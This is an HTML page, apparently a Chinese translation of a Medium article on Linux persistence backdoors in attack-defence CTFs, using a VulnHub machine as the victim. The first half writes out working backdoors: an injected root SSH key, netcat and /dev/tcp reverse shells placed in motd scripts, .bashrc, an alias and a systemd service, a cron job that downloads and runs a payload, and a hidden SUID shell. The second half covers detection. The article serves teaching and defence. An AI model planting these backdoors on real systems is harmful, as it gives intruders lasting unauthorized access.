<html>
<head>
<title>Linux Backdoors and Where to Find Them</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Linux后门以及在哪里可以找到它们</h1>
<blockquote>原文：<a href="https://medium.com/geekculture/linux-backdoors-and-where-to-find-them-3b29888bdb98?source=collection_archive---------13-----------------------#2021-05-26">https://medium.com/geekculture/linux-backdoors-and-where-to-find-them-3b29888bdb98?source=collection_archive---------13-----------------------#2021-05-26</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><figure class="ev ex ig ih ii ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es if"><img src="../Images/0e36dbf4e330ac7df783457cb0cc845f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*fjWn1PqfKjnnHAtW"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Photo by <a class="ae iu" href="https://unsplash.com/@pechka?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">Dima Pechurin</a> on <a class="ae iu" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">Unsplash</a></figcaption></figure><p id="c527" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">在攻防CTF中，留下后门是保持对目标系统访问的重要部分。因此，学习一些后门技术是必不可少的，不仅对于攻击者，对于防御者也是如此。</p><h1 id="d3cc" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">后门，是什么？</h1><p id="f631" class="pw-post-body-paragraph iv iw hi ix b iy kr ja jb jc ks je jf jg kt ji jj jk ku jm jn jo kv jq jr js hb bi translated">我不会像<a class="ae iu" href="https://en.wikipedia.org/wiki/Backdoor_(computing)" rel="noopener ugc nofollow" target="_blank">维基百科</a>那样详细，但这里有:</p><p id="0646" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">后门程序是一段隐藏的代码、脚本或程序，放置在一个系统上用于持久保存，因此您不必两次利用同一个系统。它只是让你更快和即时进入系统。</p><p id="1833" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">现在我们知道了什么是后门，让我们来看看攻击者通常把它们藏在Linux系统的什么地方！</p><p id="72d3" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">为了演示，我将使用VulnHub的<a class="ae iu" href="https://www.vulnhub.com/entry/pinkys-palace-v1,225/" rel="noopener ugc nofollow" target="_blank"> Pinky's Palace </a>机器作为受害者服务器，让我们假设它已经完全被入侵。</p><h2 id="0545" class="kw ju hi bd jv kx ky kz jz la lb lc kd jg ld le kh jk lf lg kl jo lh li kp lj bi translated">1.SSH密钥</h2><p id="9658" class="pw-post-body-paragraph iv iw hi ix b iy kr ja jb jc ks je jf jg kt ji jj jk ku jm jn jo kv jq jr js hb bi translated">一个<a class="ae iu" href="https://www.ssh.com/academy/ssh/authorized_keys/openssh" rel="noopener ugc nofollow" target="_blank"> authorized_keys </a> ( <code class="du lk ll lm ln b">~/.ssh/authorized_keys</code>)文件包含一个授权用户的列表，这些用户被允许登录到您的服务器中的特定帐户(以公钥的形式)。在这个文件中，攻击者还可以放置他们的公钥来授权自己，并通过SSH获得对系统的即时访问。</p><p id="6892" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">现在让我们看一下下图，该图显示了获取受害者服务器(Pinky's Palace)根用户访问权限的利用步骤。</p><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es lo"><img src="../Images/faefd73b2870bc0eae888302497fd27b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G5FSvQr8xxqRSlE9XWGSKQ.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Exploiting binary for root access</figcaption></figure><p id="8f80" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">当然，作为一名攻击者，我不想再次重复所有这些利用步骤来获得root访问权限。</p><p id="937c" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">因此，在我的攻击机器上，我可以使用以下命令生成一对新的<a class="ae iu" rel="noopener" href="/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54"> SSH密钥</a>用于后门目的:</p><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es lt"><img src="../Images/237edca514c415e54a985762413e26a1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ROkCsGD8Lf70wxNJ5vzNjg.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Generating SSH keys</figcaption></figure><p id="750e" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">它应该生成两个文件:一个是私钥(<code class="du lk ll lm ln b">backdoor_ssh</code>)，另一个是公钥(<code class="du lk ll lm ln b">backdoor_ssh.pub</code>)。</p><p id="83a0" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">现在，通过将公钥(<code class="du lk ll lm ln b">backdoor_ssh.pub</code>)插入root帐户的<code class="du lk ll lm ln b">authorized_keys</code>文件，我已经授权自己通过SSH获得root shell。</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="9a64" class="kw ju hi ln b fi ly lz l ma mb"># echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILaxTiK3WJJ422K1yf/9yXFWBeWV6mpZxMEualO2uIul root@kali' &gt; /root/.ssh/authorized_keys</span></pre><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es lo"><img src="../Images/fd63b176718e05009a9e36e101671eda.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YD0RMf2qTLeEq7dcgGTNcQ.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Using SSH keys as backdoor</figcaption></figure><h2 id="4bc2" class="kw ju hi bd jv kx ky kz jz la lb lc kd jg ld le kh jk lf lg kl jo lh li kp lj bi translated">2.SSH motd</h2><p id="5ad8" class="pw-post-body-paragraph iv iw hi ix b iy kr ja jb jc ks je jf jg kt ji jj jk ku jm jn jo kv jq jr js hb bi translated">这是我从名为<a class="ae iu" href="https://www.hackthebox.eu/home/machines/profile/233" rel="noopener ugc nofollow" target="_blank"> Traceback的黑客机器中学到的一个很酷的技巧。</a></p><p id="d58f" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated"><strong class="ix hj"> Motd </strong>(每日消息)是当您使用SSH登录服务器时出现的横幅。这些消息通常由各种脚本构成，你可以在<code class="du lk ll lm ln b">/etc/update-motd.d/</code>下找到(对于大多数基于Debian的发行版)。默认情况下，其他用户对该目录没有写权限。</p><p id="fd88" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">在下图中，只有一个名为<code class="du lk ll lm ln b">10-uname</code>的<strong class="ix hj"> motd </strong>脚本。当我使用SSH登录到机器时，脚本的输出被打印出来。</p><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mc"><img src="../Images/832e893a1088cbf1ad43c745db70163a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vCTbvqZudmuor6l6d10VwQ.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Motd script</figcaption></figure><p id="d235" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">作为一个攻击者，我可以放一个新的脚本像<a class="ae iu" href="https://www.techslang.com/definition/what-is-a-reverse-shell/" rel="noopener ugc nofollow" target="_blank"> reverse shell </a>作为后门，然后我可以设置一个netcat监听器。</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="10f9" class="kw ju hi ln b fi ly lz l ma mb">root@pinkys-palace:/etc/update-motd.d# echo -e '#!/bin/sh\nnc 192.168.2.103 9001 -e /bin/bash &amp;' &gt; 20-backdoor &amp;&amp; chmod +x 20-backdoor</span></pre><p id="8b0c" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">现在，如果有人SSH登录到服务器，后门脚本将被执行，并发送一个外壳访问我的netcat监听器。</p><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es md"><img src="../Images/c2e3cb4a386ec528e9bd3ff0f8766643.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*x_kTnL9a2SY0KKQQMnxI3Q.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Backdoor triggered by SSH login</figcaption></figure><p id="67f7" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">在上图中，我模拟了一个使用低权限帐户的SSH登录，但是您注意到了吗，我最终获得了root访问权限？</p><p id="a95a" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">下面是<a class="ae iu" href="http://manpages.ubuntu.com/manpages/xenial/en/man5/update-motd.5.htm" rel="noopener ugc nofollow" target="_blank">回答</a>:</p><blockquote class="me mf mg"><p id="e037" class="iv iw mh ix b iy iz ja jb jc jd je jf mi jh ji jj mj jl jm jn mk jp jq jr js hb bi translated"><em class="hi">……</em></p><p id="540b" class="iv iw mh ix b iy iz ja jb jc jd je jf mi jh ji jj mj jl jm jn mk jp jq jr js hb bi translated">每次登录时,/etc/update-motd.d/*中的可执行脚本由pam_motd(8)作为根用户<strong class="ix hj">执行，该信息连接在/var/run/motd中。脚本执行的顺序由run-parts(8)–lsbsysinit选项决定(基本上是字母顺序，有一些注意事项)。</strong></p><p id="0961" class="iv iw mh ix b iy iz ja jb jc jd je jf mi jh ji jj mj jl jm jn mk jp jq jr js hb bi translated"><em class="hi"> … </em></p></blockquote><h2 id="646e" class="kw ju hi bd jv kx ky kz jz la lb lc kd jg ld le kh jk lf lg kl jo lh li kp lj bi translated">3.用户的。bashrc——互动会议</h2><p id="fc3e" class="pw-post-body-paragraph iv iw hi ix b iy kr ja jb jc ks je jf jg kt ji jj jk ku jm jn jo kv jq jr js hb bi translated"><code class="du lk ll lm ln b">.bashrc</code>是伯恩shell使用的启动脚本之一，又名<code class="du lk ll lm ln b">bash</code>。如果有一个用户使用<code class="du lk ll lm ln b">bash</code>作为他们的登录shell，那么这个<code class="du lk ll lm ln b">.bashrc</code>将为他们启动的每个交互会话执行。</p><p id="b145" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">以下是触发交互式会话的一些操作:</p><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es ml"><img src="../Images/13c08a0ac289cf4e5bbbdfb1d41a5f74.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GyRNMHvRW6srPr4c6Gmu8g.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Actions that triggers interactive session</figcaption></figure><p id="ff57" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">在上图中，我在我的<code class="du lk ll lm ln b">.bashrc</code>中插入了一个非恶意的脚本<code class="du lk ll lm ln b">echo "I'm triggered"</code>。但是现在，作为一个攻击者，我可以在那里放一些类似reverse shell的东西，我只需要等待有人登录来触发它。</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="2c2e" class="kw ju hi ln b fi ly lz l ma mb">pinky@pinkys-palace:~$ echo 'nc 192.168.2.103 9001 -e /bin/bash &gt;/dev/null &amp;' &gt; .bashrc</span></pre><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mm"><img src="../Images/e219c19bc0547d33b32279cc47d06c30.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j-KNBsyD3WQkpQ-MU7wkxA.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Backdoor triggered by interactive session</figcaption></figure><p id="a1dc" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">在上图中，我从<code class="du lk ll lm ln b">root</code>切换到用户<code class="du lk ll lm ln b">pinky</code>，并在pinky的<code class="du lk ll lm ln b">.bashrc</code>文件上放了一个反向shell。我退出pinky的shell并立即切换回用户<code class="du lk ll lm ln b">pinky</code>来触发一个交互会话。</p><h2 id="2e0d" class="kw ju hi bd jv kx ky kz jz la lb lc kd jg ld le kh jk lf lg kl jo lh li kp lj bi translated">4.用户的。bashrc —别名</h2><p id="3952" class="pw-post-body-paragraph iv iw hi ix b iy kr ja jb jc ks je jf jg kt ji jj jk ku jm jn jo kv jq jr js hb bi translated">作为攻击者，我也可以在用户的别名中设置后门！</p><p id="28ef" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">下面是一个使用<code class="du lk ll lm ln b">cd</code>命令的别名以(再次)反向shell的形式创建后门的例子。</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="d6dc" class="kw ju hi ln b fi ly lz l ma mb">root@pinkys-palace:~# alias cd='$(nc 192.168.2.103 9001 -e /bin/bash&amp;); cd'</span></pre><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es mn"><img src="../Images/7a973b27e22f70465a5739c711bf23f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N2yKBd4biEz5w9nuMNd1EQ.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Backdoor using alias</figcaption></figure><p id="19c6" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">以下是其他一些别名后门:</p><ul class=""><li id="1961" class="mo mp hi ix b iy iz jc jd jg mq jk mr jo ms js mt mu mv mw bi translated"><a class="ae iu" href="https://github.com/nisay759/sudo-backdoor" rel="noopener ugc nofollow" target="_blank">https://github.com/nisay759/sudo-backdoor</a></li><li id="1c75" class="mo mp hi ix b iy mx jc my jg mz jk na jo nb js mt mu mv mw bi translated"><a class="ae iu" href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb" rel="noopener ugc nofollow" target="_blank">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li></ul><h2 id="bc2b" class="kw ju hi bd jv kx ky kz jz la lb lc kd jg ld le kh jk lf lg kl jo lh li kp lj bi translated">5.克朗·乔布斯</h2><p id="a2fb" class="pw-post-body-paragraph iv iw hi ix b iy kr ja jb jc ks je jf jg kt ji jj jk ku jm jn jo kv jq jr js hb bi translated">Cron是Linux/UNIX类操作系统的一个特性，可用于定期执行特定的作业或任务，就像Windows中的任务调度程序一样。</p><p id="e71e" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">下面是一个使用Cron job的后门的例子。</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="a437" class="kw ju hi ln b fi ly lz l ma mb">root@pinkys-palace:~# echo '* * * * * root cd /tmp; wget 192.168.2.103/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor' &gt; /etc/cron.d/backdoor</span></pre><p id="6b7d" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">上面的任务是从我的攻击机器上下载一个叫做“后门”的恶意二进制文件，然后后门每分钟执行一次。</p><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es nc"><img src="../Images/4a01e0708382c71c372a351dcf0de7b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cMN0bK_iQnN8pNSRJ_jKYg.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Cron backdoor</figcaption></figure><h2 id="01eb" class="kw ju hi bd jv kx ky kz jz la lb lc kd jg ld le kh jk lf lg kl jo lh li kp lj bi translated">6.后门即服务</h2><p id="5c3b" class="pw-post-body-paragraph iv iw hi ix b iy kr ja jb jc ks je jf jg kt ji jj jk ku jm jn jo kv jq jr js hb bi translated">攻击者还可以创建后门服务(BaaS)。以下是单个文件(<code class="du lk ll lm ln b">backdoor.service</code>)中的BaaS示例:</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="ce49" class="kw ju hi ln b fi ly lz l ma mb">[Service]<br/>Type=simple<br/>User=root<br/>ExecStart=/bin/bash -c "bash -i &gt;&amp; /dev/tcp/192.168.2.103/9001 0&gt;&amp;1"<br/>[Install]<br/>WantedBy=multi-user.target'</span></pre><p id="e9db" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">当服务启动时，它会向攻击者发起一个反向外壳。</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="7d5c" class="kw ju hi ln b fi ly lz l ma mb">root@pinkys-palace:/etc/systemd/system# systemctl start backdoor.service</span></pre><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es nc"><img src="../Images/4ca0e08316b186ba51df3fc2fed85895.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dZzJsqNznim_gtQqRAFZOw.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">BaaS</figcaption></figure><p id="57ee" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">它可以在引导时通过发出以下命令来启用:</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="b710" class="kw ju hi ln b fi ly lz l ma mb">root@pinkys-palace:/etc/systemd/system# systemctl enable backdoor.service</span></pre><h2 id="6d94" class="kw ju hi bd jv kx ky kz jz la lb lc kd jg ld le kh jk lf lg kl jo lh li kp lj bi translated">7.SUID</h2><p id="9713" class="pw-post-body-paragraph iv iw hi ix b iy kr ja jb jc ks je jf jg kt ji jj jk ku jm jn jo kv jq jr js hb bi translated">这个帖子的最后一个是<a class="ae iu" href="https://en.wikipedia.org/wiki/Setuid" rel="noopener ugc nofollow" target="_blank"> SUID </a>。SUID允许其他用户以可执行文件所有者的身份运行可执行二进制文件。</p><p id="3d7e" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">作为一个例子，我可以复制一个bash二进制文件(root所有)，名为<code class="du lk ll lm ln b">.backdoor</code>(注意这个点)，将SUID权限设置为一个低权限用户，这个用户已经受到了威胁。</p><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es nd"><img src="../Images/fa274d38aa472cbc0138147b879ace10.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XTVJlkMGc9aUQwfrnYRvKg.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">SUID backdoor on low privilege user</figcaption></figure><p id="6087" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">为什么我加了一个点？有些人倾向于只使用<code class="du lk ll lm ln b">ls -l</code>而不使用<code class="du lk ll lm ln b">ls -la</code>，这成为攻击者在点文件中放置后门的优势。</p><h1 id="e9c7" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">蓝队这边</h1><p id="7bf2" class="pw-post-body-paragraph iv iw hi ix b iy kr ja jb jc ks je jf jg kt ji jj jk ku jm jn jo kv jq jr js hb bi translated">在进一步阅读之前，我要声明，如果你的服务器(irl)遭到黑客攻击，最好恢复服务器的备份或完全从头开始重建，因为在现实世界中，这些后门可能会被混淆，并且<strong class="ix hj">会将</strong>与其他技术结合起来(更不用说可能还有rootkit)，这使得检测/发现变得很困难。</p><p id="e78b" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">此外，我在这里分享的可能不是那么有效，但这里是我通常如何处理CTF攻防中的后门。</p><h2 id="d575" class="kw ju hi bd jv kx ky kz jz la lb lc kd jg ld le kh jk lf lg kl jo lh li kp lj bi translated">SSH密钥和. bashrc。</h2><p id="f741" class="pw-post-body-paragraph iv iw hi ix b iy kr ja jb jc ks je jf jg kt ji jj jk ku jm jn jo kv jq jr js hb bi translated">确保定期检查所有用户的<code class="du lk ll lm ln b">authorized_keys</code>文件。</p><p id="32f9" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">下图中，有一个公钥是外国主机名<code class="du lk ll lm ln b">kali</code>而不是<code class="du lk ll lm ln b">pinkys-palace</code>，那么你应该怀疑它。</p><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es ne"><img src="../Images/09df807c6af2f0c5a4772757e44be056.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i9EBY8k9OY17HCUiRNHzgg.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Suspicious public key in authorized_keys file</figcaption></figure><p id="509a" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">嗯，实际上，攻击者可能会欺骗它，让它看起来像是合法的。</p><p id="998b" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">我在这里的解决方法是，为什么我们不创建一个包含所有<code class="du lk ll lm ln b">authorized_keys</code>文件的“框架”文件，并设置一个cronjob来自动将这些文件恢复到原始状态，我可以通过<code class="du lk ll lm ln b">scp</code>远程执行这个操作。在<code class="du lk ll lm ln b">.bashrc</code>处理后门也可以用这个。</p><blockquote class="me mf mg"><p id="e54c" class="iv iw mh ix b iy iz ja jb jc jd je jf mi jh ji jj mj jl jm jn mk jp jq jr js hb bi translated">在<code class="du lk ll lm ln b">/etc/skel</code>可以找到<code class="du lk ll lm ln b">.bashrc</code>的骨架文件。</p></blockquote><h2 id="f845" class="kw ju hi bd jv kx ky kz jz la lb lc kd jg ld le kh jk lf lg kl jo lh li kp lj bi translated">SSH motd</h2><p id="77b7" class="pw-post-body-paragraph iv iw hi ix b iy kr ja jb jc ks je jf jg kt ji jj jk ku jm jn jo kv jq jr js hb bi translated">它并不总是放在<code class="du lk ll lm ln b">/etc/update-motd.d/</code>下，但要确保<strong class="ix hj"> motd </strong>目录只对root可写，注意默认的<strong class="ix hj"> motd </strong>文件列表，并应用与上面相同的东西(框架文件)，因为攻击者可能在原始文件中插入了后门。</p><p id="b9a2" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">我们还可以使用时间戳进行一些“取证”:</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="90ca" class="kw ju hi ln b fi ly lz l ma mb">$ ls --full-time</span></pre><p id="1c61" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">例如，下图中时间戳为<code class="du lk ll lm ln b">000000000</code> (nano)的这些文件很可能没有被修改，仍然处于原始状态。</p><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es md"><img src="../Images/92369d803a1bf0c56df0a1343b31564c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pWWrpdZvD7THlZxjb9Ywhw.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Nano timestamp</figcaption></figure><p id="7b4b" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">插入非恶意行后，时间戳发生了变化。从这里开始，可以很有把握地假设有人/什么东西修改了它。</p><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es nc"><img src="../Images/f073773bf5954bc01412f8586f01a40a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*StiT-Xh9jgcukJY8AKIoVg.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Timestamp changed</figcaption></figure><h2 id="6f2d" class="kw ju hi bd jv kx ky kz jz la lb lc kd jg ld le kh jk lf lg kl jo lh li kp lj bi translated">Cronjobs和服务</h2><p id="e4d6" class="pw-post-body-paragraph iv iw hi ix b iy kr ja jb jc ks je jf jg kt ji jj jk ku jm jn jo kv jq jr js hb bi translated">对于这一个，监控是关键。我们可以使用<code class="du lk ll lm ln b">netstat</code>或<code class="du lk ll lm ln b">ss</code>命令和<code class="du lk ll lm ln b">ps</code>命令来监控网络套接字和进程。如果一个程序有一个IP和端口作为它的参数，请对它保持怀疑。还要确保这些命令不会被攻击者使用别名(就像<a class="ae iu" href="https://github.com/iamckn/backdoors/blob/master/bd_hide.sh" rel="noopener ugc nofollow" target="_blank">这个</a>一样)。</p><p id="036d" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">为此，我们可以使用以下命令查找任何不需要的开放端口:</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="7390" class="kw ju hi ln b fi ly lz l ma mb">$ netstat -antp | grep LISTEN</span></pre><p id="9188" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">要查找可疑的连接，我们可以使用以下命令:</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="d645" class="kw ju hi ln b fi ly lz l ma mb">$ netstat -antp | grep ESTABLISHED</span></pre><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es nf"><img src="../Images/2d1a1ce531db944829cde50f5e5e35cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*a_Kej5P2aPzA2PdPZWvonA.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Suspicious connections</figcaption></figure><p id="1327" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">有时，反向外壳后门的状态既不是ESTABLISHED也不是LISTEN而是SYN_SENT。当后门无法联系到攻击者时，就会发生这种情况。为此，我们可以使用以下命令:</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="e392" class="kw ju hi ln b fi ly lz l ma mb">$ netstat -antp | grep SYN_SENT</span></pre><p id="47d1" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">接下来，我们可以使用以下命令检查每个用户的crontab:</p><pre class="lp lq lr ls fd lu ln lv lw aw lx bi"><span id="4c73" class="kw ju hi ln b fi ly lz l ma mb">$ for user in $(cat /etc/passwd | cut -f1 -d: ); do echo $user; crontab -u $user -l; done</span><span id="1bb8" class="kw ju hi ln b fi ng lz l ma mb"># Check for users who have login shell only<br/>$ for user in $(cat /etc/passwd | grep sh$ | cut -f1 -d: ); do echo $user; crontab -u $user -l; done</span></pre><p id="9a52" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">还有<code class="du lk ll lm ln b">ps -f</code>命令，它非常擅长可视化流程树。例如，在下图中，我们可以很容易地判断出一直打开HTTPS端口(443)的“罪魁祸首”可能在<code class="du lk ll lm ln b">.bashrc</code>文件中，因为它在我们每次启动bash shell(交互式会话)时都会被触发。</p><figure class="lp lq lr ls fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es nf"><img src="../Images/8754f0891fb7b7c58cad6528cf8a1eda.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Lr6kD_R6PVccJOmctqjgWw.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Visualizing process tree</figcaption></figure><p id="a4f7" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">如果您喜欢详细的视图，可以考虑使用<code class="du lk ll lm ln b">ps auxfww</code>来显示带有用户名、TTY和广泛输出的流程树。</p><p id="9dd6" class="pw-post-body-paragraph iv iw hi ix 